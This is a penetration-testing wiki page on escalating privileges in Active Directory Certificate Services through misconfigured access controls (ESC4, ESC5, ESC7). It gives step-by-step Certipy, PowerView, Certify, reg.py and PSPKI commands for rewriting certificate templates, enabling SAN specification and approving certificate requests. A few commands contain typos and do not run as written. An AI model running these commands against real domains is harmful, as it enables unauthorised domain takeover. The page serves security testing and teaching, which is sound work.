# Access controls

## Theory

In [their research papers](https://posts.specterops.io/certified-pre-owned-d95910965cd2), [Will Schroeder](https://twitter.com/harmj0y) and [Lee Christensen](https://twitter.com/tifkin\_) found multiple vectors of domain escalation based on access control misconfigurations (dubbed [ESC4](https://posts.specterops.io/certified-pre-owned-d95910965cd2#7c4b), [ESC5](https://posts.specterops.io/certified-pre-owned-d95910965cd2#0a38) and [ESC7](https://posts.specterops.io/certified-pre-owned-d95910965cd2#fdbf)).&#x20;

Active Directory Certificate Services add multiple objects to AD, including securable ones which principals can have permissions over. This includes:

* **Certificate templates (ESC4)**: powerful rights over these objects can allow attackers to _"push a misconfiguration to a template that is not otherwise vulnerable (e.g., by enabling the `mspki-certificate-name-flag` flag for a template that allows for domain authentication) this results in the same domain compromise scenario \[...]" (_[_specterops.io_](https://posts.specterops.io/certified-pre-owned-d95910965cd2)_)_ as the one based on misconfigured certificate templates where low-privs users can specify an arbitrary SAN (`subjectAltName`) and authenticate as anyone else. &#x20;
* **The Certificate Authority (ESC7)**: _"The two main rights here are the `ManageCA` right and the `ManageCertificates` right, which translate to the “CA administrator” and “Certificate Manager” (sometimes known as a CA officer) respectively. known as Officer rights)" (_[_specterops.io_](https://posts.specterops.io/certified-pre-owned-d95910965cd2)_)_.&#x20;
  * If an attacker gains control over a principal that has the ManageCA right over the CA, he can remotely flip the `EDITF_ATTRIBUTESUBJECTALTNAME2` bit to allow SAN specification in any template (c.f. [CA misconfiguration](ca-configuration.md)).
  * If an attacker gains control over a principal that has the ManageCertificates right over the CA, he can remotely approve pending certificate requests, subvertnig the "CA certificate manager approval" protection (referred to as PREVENT4 in [the research whitepaper](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf)).
* **Several other objects (ESC5):** abuse standard [AD access control abuse](../dacl/) over regulard AD objects.
  * The CA server’s AD computer object (i.e., compromise through [RBCD abuse](../kerberos/delegations/rbcd.md), [Shadow Credentials](../kerberos/shadow-credentials.md), [UnPAC-the-hash](../kerberos/unpac-the-hash.md), ...).
  * The CA server’s RPC/DCOM server
  * Any descendant AD object or container in the container `CN=Public Key Services,CN=Services,CN=Configuration,DC=DOMAIN,DC=LOCAL` (e.g., the Certificate Templates container, Certification Authorities container, the `NTAuthCertificates` object, the `Enrollment Services` Container, etc.) If a low-privileged attacker can gain control over any of these, the attack can likely compromise the PKI system.
  * ...

## Practice

{% hint style="info" %}
Maliciously configuring a CA or a certificate template can be insufficient. A controlled AD object (user or computer) must also have the ability to request a certificate for that template. The controlled AD object must have `Certificate-Enrollment` rights over the enrollment services (i.e. CA) **and** over the certificate template ([source](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/#section-2-2-3)).

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)'s [Add-DomainObjectAcl](https://powersploit.readthedocs.io/en/latest/Recon/Add-DomainObjectAcl/) function (in [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)) can be used to add `Certificate-Enrollment` rights to a "controlled AD object" over a specific template. In order to achieve this, the attacker needs to have enough rights (i.e. [`WriteDacl`](../dacl/grant-rights.md)) over the certificate template.

```powershell
Add-DomainObjectAcl -TargetIdentity "target template" -PrincipalIdentity "controlled object" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=DOMAIN,DC=LOCAL" -Verbose
```

The example above shows how to edit a certificate template's DACL (requires [`WriteDacl`](../dacl/grant-rights.md) over the template, i.e. [ESC4](access-controls.md#certificate-templates-esc4)), but modifying a CA's DACL follows the same principle (requires [`WriteDacl`](../dacl/grant-rights.md) over the CA, i.e. [ESC7](access-controls.md#certificate-authority-esc7)).
{% endhint %}

### Certificate templates (ESC4)

In order to obtain an abusable template, some attributes and parameters need to be properly setup

1. Get Enrollment rights for the vulnerable template
2. Disable `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` for disabling Manager Approval
3. Set `mspki-ra-signature` attribute to `0` to disable Authorized Signature requirement
4. Enable `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` to allow requesting users to specify another privileged account name as a SAN
5. Set `mspki-certificate-application-policy` to a certificate purpose for authentication
   1. Client Authentication (OID: `1.3.6.1.5.5.7.3.2`)
   2. Smart Card Logon (OID: `1.3.6.1.4.1.311.20.2.2`)
   3. PKINIT Client Authentication (OID: `1.3.6.1.5.2.3.4`)
   4. Any Purpose (OID: `2.5.29.37.0`)
   5. No EKU
6. Request a certificate (with a high-privileged user's name set as SAN) for authentication and perform [Pass the Ticket](../kerberos/ptt.md).

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate these sensitive access control entries ([how to enumerate](./#attack-paths)), and to overwrite the template in order to add the SAN attribute and make it vulnerable to ESC1. It also had the capacity to save the old configuration in order to restore it after the attack.

```bash
# 1. Overwrite the certificate template and save the old configuration
certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -save-old

# 2. After the ESC1 attack, restore the original configuration
certipy template -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -template templateName -configuration 'templateName.json'
```

If a more precise template modification is needed, [modifyCertTemplate](https://github.com/fortalice/modifyCertTemplate) (Python) can be used to modify each attributes of the template.

```bash
# 1. Disable Manager Approval Requirement
modifyCertTemplate.py -template templateName -value 2 -property mspki-enrobashllment-flag "$DOMAIN/$USER:$PASSWORD"

# 2. Disable Authorized Signature Requirement
modifyCertTemplate.py -template templateName -value 0 -property mspki-ra-signature "$DOMAIN/$USER:$PASSWORD"

# 3. Enable SAN Specification
modifyCertTemplate.py -template templateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag "$DOMAIN/$USER:$PASSWORD"

# 4. Edit Certificate Application Policy Extension
modifyCertTemplate.py -template templateName -value "'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'" -property mspki-certificate-application-policy "$DOMAIN/$USER:$PASSWORD"
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate these sensitive access control entries. At the time of writing (October 21st, 2021) [BloodHound](../../recon/bloodhound.md) doesn't support (yet) enumeration of these access controls. [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) can be used to modify the template.

```powershell
# 1. Enumerate sensitive access control entries
Certify.exe find

# 2. Disable Manager Approval Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity tempalteName -XOR @{'mspki-enrollment-flag'=2} -Verbose

# 3. Disable Authorized Signature Requirement
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-ra-signature'=0} -Verbose

# 4. Enable SAN Specification
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -XOR @{'mspki-certificate-name-flag'=1} -Verbose

# 5. Edit Certificate Application Policy Extension
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity templateName -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
If sensitive access entries are identified, creativity will be the best ally.&#x20;

Currently, the best resources for manually abusing this are&#x20;

* [Abusing weak ACL on Certificate Templates (by daemon0cc0re)](https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates)
* [AD-CS The Certified Pre Owned Attacks (by HTTP418)](https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4)
{% endhint %}

### Certificate Authority (ESC7)

If sufficient rights are obtained over the Certificate Authority (Access Controls, local admin account, ...) an attacker could remotely edit the registries, enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute, restart the `CertSvc` service,  and abuse [ESC6 (CA configuration abuse)](ca-configuration.md).

```bash
## Beware: change placeholder values CA-NAME, VALUE, NEW_VALUE

# query flags
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" query -keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags

# bitwise OR to set the flag if not already (nothing changed if already set)
python3 -c print("NEW_VALUE:", VALUE | 0x40000)

# write flags
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@$"ADCS_IP" add-keyName 'HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA-NAME\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd NEW_VALUE
```

When it is not possible to restart the `CertSvc` service to enable the `EDITF_ATTRIBUTESUBJECTALTNAME2` attribute,the built-in template **SubCA** can be usefull.

It is vulnerable to the ESC1 attack, but only **Domain Admins** and **Enterprise Admins** can enroll in it. If a standard user try to enroll in it with [Certipy](https://github.com/ly4k/Certipy), he will encounter a `CERTSRV_E_TEMPLATE_DENIED` errror and will obtain a request ID with a corresponding private key.

This ID can be used by a user with the **ManageCA** _and_ **ManageCertificates** rights to validate the failed request. Then, the user can retrieve the issued certificate by specifying the same ID.

#### ManageCA Rights

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object ([how to enumerate](./#attack-paths)) and modify some CA's attributes like the officiers list (an officier is a user with the **ManageCertificate** rights) or the enabled certificate templates.

```bash
# Add a new officier
certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -add-officier 'user'

# List all the templates
certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -list-templates

# Enable a certificate template
certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -enable-template 'SubCA'
```

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object.

Then, [PSPKI](https://github.com/PKISolutions/PSPKI) (PowerShell) can be used to modify the CA object ([RSAT](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is needed on the machine where PSPKI is run).

```powershell
Certify.exe cas

# Install PSPKI
Install-Module -Name PSPKI
Import-Module PSPKI

# Get the current value of EDITF_ATTRIBUTESUBJECTALTNAME2 and modify it with SetConfigEntry
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "CA.domain.local"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)
certutil.exe -config "CA.domain.local\CA" -getreg "policy\EditFlags"
```



If RSAT is not present, it can installed like this:

```batch
DISM.exe /Online /Get-Capabilities
DISM.exe /Online /add-capability /CapabilityName:Rsat.CertificateServices.Tools~~~~0.0.1.0
```
{% endtab %}
{% endtabs %}

#### ManageCertificates Rights

{% tabs %}
{% tab title="UNIX-like" %}
From UNIX-like systems, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used to enumerate access rights over the CA object ([how to enumerate](./#attack-paths)). Coupled with the **ManageCA** right, it is possible to issue a certificate from a failed request.

```bash
# Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -issue-request 100

# Retrieve an issued certificate
certipy req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -retrieve 100
```

The certificate can then be used with [Pass-The-Certificate](../kerberos/pass-the-certificate.md) to obtain a TGT and authenticate.

{% hint style="info" %}
By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The `-scheme` flag can be used to set whether to use LDAP or LDAPS.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
From Windows systems, the [Certify](https://github.com/GhostPack/Certify) (C#) tool can be used to enumerate info about the CAs, including access rights over the CA object, and to request a certificate that requires manager approval.

Then, [PSPKI](https://github.com/PKISolutions/PSPKI) (PowerShell) can be used to approve a certificate request ([RSAT](https://docs.microsoft.com/fr-fr/troubleshoot/windows-server/system-management-components/remote-server-administration-tools) is needed on the machine where PSPKI is used). PSPKI is a PowerShell module used to "simplify various PKI and AD CS management tasks".

```powershell
# 1. Request a certificate that requires manager approval with Certify
Certify.exe request /ca:CA.domain.local\CA /template:ApprovalNeeded
...
[*] Request ID : 1

# 2. Install PSPKI on a controlled Windows host
Install-Module -Name PSPKI
Import-Module PSPKI

# 3. Approve the pending request with PSPKI
PSPKI > Get-CertificationAuthority -ComputerName CA.domain.local | Get-PendingRequest -RequestID 1 | Approve-CertificateRequest

# 4. Download the certificate with Certify
Certify.exe download /ca:CA.domain.local\CA /id:1
```
{% endtab %}
{% endtabs %}

{% hint style="warning" %}
If sensitive rights are identified, creativity will be the best ally. Not much public tooling is available at the time of writing (October 21st, 2021).

Currently, the best resources for manually abusing this are&#x20;

* [the whitepaper](https://www.specterops.io/assets/resources/Certified\_Pre-Owned.pdf) (PDF)
* [Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more! (by Olivier Lyak)](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)
* [Abusing weak ACL on Certificate Templates (by daemon0cc0re)](https://github.com/daem0nc0re/Abusing\_Weak\_ACL\_on\_Certificate\_Templates)
* [AD-CS The Certified Pre Owned Attacks (by HTTP418)](https://http418infosec.com/ad-cs-the-certified-pre-owned-attacks#esc4)
* [AD CS Abuse (by snovvcrash)](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse#vulnerable-ca-aces-esc7)
{% endhint %}

### Other objects (ESC5)

This can be enumerated and abused like regular AD access control abuses. Once control over an AD-CS-related is gained, creativity will be the attacker's best ally.

{% content-ref url="../dacl/" %}
[dacl](../dacl/)
{% endcontent-ref %}

## Resources

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

{% embed url="https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6" %}

{% embed url="https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment#section-3-6" %}

{% embed url="https://github.com/daem0nc0re/Abusing_Weak_ACL_on_Certificate_Templates" %}
